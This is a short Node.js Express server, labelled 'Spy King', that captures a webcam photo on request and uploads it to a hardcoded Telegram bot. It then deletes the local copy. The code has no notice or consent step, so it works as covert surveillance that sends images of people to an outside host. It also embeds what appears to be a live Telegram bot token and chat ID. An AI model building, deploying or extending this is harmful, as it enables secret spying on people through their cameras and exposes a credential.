const express = require("express");
const NodeWebcam = require("node-webcam");
const fetch = require("node-fetch");
const fs = require("fs");
const FormData = require("form-data");
const app = express();
const port = 3000;

// Telegram info
const telegramBotToken = "8079056355:AAGP1alTryOpzFmtk8ZxNWKxs6q59Mbuj70"; // replace safely
const chatId = "8182050140";             // replace safely

const opts = {
    width: 640,
    height: 480,
    quality: 100,
    saveShots: true,
    output: "jpeg",
    device: false,
    callbackReturn: "location",
    verbose: false
};

const Webcam = NodeWebcam.create(opts);

async function sendPhoto(filePath) {
    const form = new FormData();
    form.append("chat_id", chatId);
    form.append("photo", fs.createReadStream(filePath));

    const res = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
        method: "POST",
        body: form
    });
    console.log(await res.json());
}

app.use(express.static("."));
app.use(express.json());

app.post("/capture", async (req, res) => {
    const fileName = `capture_${Date.now()}.jpg`;
    NodeWebcam.capture(fileName, opts, async function(err, data) {
        if (err) {
            console.error(err);
            res.status(500).send("Error capturing image");
        } else {
            await sendPhoto(fileName);
            fs.unlinkSync(fileName); // delete after send
            res.send("Captured and sent");
        }
    });
});

app.listen(port, () => {
    console.log(`Spy King server running at http://localhost:${port}`);
});
